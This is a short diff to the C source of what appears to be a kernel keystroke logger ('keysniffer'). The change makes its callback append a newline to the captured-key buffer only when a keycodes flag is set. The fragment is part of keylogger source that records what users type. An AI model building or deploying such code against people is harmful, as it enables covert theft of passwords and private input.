@@ -169,7 +169,9 @@ int keysniffer_cb(struct notifier_block *nblock,
 
 	strncpy(keys_buf + buf_pos, keybuf, len);
 	buf_pos += len;
-	keys_buf[buf_pos++] = '\n';
+	/* Append newline to keycodes */
+	if (codes)
+		keys_buf[buf_pos++] = '\n';
 	pr_debug("%s\n", keybuf);
 
 	return NOTIFY_OK;
